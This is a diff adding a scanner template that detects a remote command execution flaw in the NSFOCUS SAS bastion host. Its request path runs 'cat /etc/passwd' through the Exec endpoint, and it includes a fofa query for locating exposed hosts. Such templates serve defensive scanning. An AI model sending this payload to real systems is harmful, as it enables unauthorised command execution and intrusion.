@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <code>200</code>
+          - WEBSVC OK
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/webconf/Exec/index?cmd=cat%20/etc/passwd'
+id: nsfocus-sas-exec-rce
+info:
+  author: peiqi
+  description: |-
+    绿盟 SAS堡垒机 Exec 远程命令执行漏洞
+    fofa: body="'/needUsbkey.php?username='"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 绿盟 SAS堡垒机 Exec 远程命令执行漏洞
+  severity: high
+  tags: nsfocus,rce,argus-import
